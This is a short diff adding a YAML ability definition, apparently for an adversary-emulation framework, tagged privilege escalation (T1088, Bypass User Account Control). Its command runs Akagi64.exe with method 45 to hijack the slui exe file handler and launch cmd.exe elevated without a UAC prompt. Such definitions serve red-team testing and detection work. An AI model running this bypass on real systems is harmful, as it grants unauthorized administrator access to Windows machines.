@@ -1,0 +1,15 @@
+---
+
+- id: b7344901-0b02-4ead-baf6-e3f629ed545f
+  description: executes the slui exe file handler hijack
+  name: 
+  platforms:
+    windows:
+        psh:
+          command: |
+            .\Akagi64.exe 45 C:\Windows\System32\cmd.exe
+          payload: Akagi64.exe
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1088
+    name: Bypass User Account Control
